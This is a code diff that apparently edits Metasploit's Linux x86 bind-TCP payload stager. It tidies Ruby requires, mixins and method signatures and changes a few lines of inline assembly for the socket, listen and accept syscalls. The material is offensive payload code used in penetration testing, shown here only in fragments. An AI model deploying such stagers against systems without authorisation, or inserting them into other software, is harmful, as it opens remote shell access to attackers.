@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/linux/send_uuid'
-
 module Msf
 
 
@@ -17,13 +13,13 @@ module Msf
 module Payload::Linux::BindTcp
 
   include Msf::Payload::TransportConfig
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X86::Prepends
   include Msf::Payload::Linux::SendUUID
 
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:     datastore['LPORT'],
       reliable: false
@@ -31,7 +27,7 @@ module Payload::Linux::BindTcp
 
     # Generate the more advanced stager if we have the space
     if self.available_space && required_space <= self.available_space
-      conf[:exitfunk] = datastore['EXITFUNC'],
+      conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
 
@@ -80,7 +76,7 @@ module Payload::Linux::BindTcp
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_bind_tcp(opts={})
@@ -128,7 +124,7 @@ module Payload::Linux::BindTcp
         push 0x66                     ; socketcall syscall
         pop eax
         int 0x80
-        xchg eax,edi                  ; restore the socket handle
+        mov eax,edi                   ; restore the socket handle
         add esp, 0x14
         pop ecx                       ; restore ecx
 
@@ -170,7 +166,7 @@ module Payload::Linux::BindTcp
         mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
         int 0x80                      ; invoke socketcall
 
-        push eax                      ; stash the listen socket
+        push edi                      ; stash the listen socket
         inc ebx                       ; SYS_ACCEPT
         mov al,0x66                   ; socketcall syscall
         mov [ecx+0x4],edx
